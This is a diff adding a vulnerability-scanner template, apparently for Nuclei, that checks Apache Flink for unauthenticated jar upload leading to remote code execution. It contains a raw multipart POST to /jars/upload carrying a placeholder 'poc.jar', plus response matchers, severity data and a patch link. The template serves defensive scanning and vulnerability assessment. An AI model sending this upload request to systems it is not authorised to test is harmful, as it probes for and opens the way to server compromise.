@@ -1,0 +1,57 @@
+id: apache-flink-unauth-rce
+info:
+  name: Apache Flink - Remote Code Execution
+  author:
+  - pikpikcu
+  tags:
+  - apache
+  - flink
+  - rce
+  - intrusive
+  - unauth
+  description: |-
+    Apache Flink 任意jar包上传漏洞
+    Apache Flink 1.5.1引入了REST处理程序，该处理程序允许通过经过恶意修改的HTTP HEADER将上传的文件写入本地文件系统上的任意位置。
+  reference:
+  - apache flink contains an unauthenticated remote code execution vulnerability.
+    - https://www.exploit-db.com/exploits/48978 - https://adamc95.medium.com/apache-flink-1-9-x-part-1-set-up-5d85fd2770f3
+    - https://github.com/landgrey/flink-unauth-rce
+  severity: critical
+  classification:
+    cwe-id:
+    - cwe-77
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+  remediation: |-
+    **官方修复方案**
+    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
+    https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d@%3Cuser.flink.apache.org%3E
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: header
+    words:
+    - application/json
+  - type: word
+    condition: and
+    part: body
+    words:
+    - success
+    - _poc.jar
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /jars/upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+
+    --8ce4b16b22b58894aa86c421e8759df3
+    Content-Disposition: form-data; name="jarfile";filename="poc.jar"
+    Content-Type:application/octet-stream
+
+      {{randstr}}
+    --8ce4b16b22b58894aa86c421e8759df3--
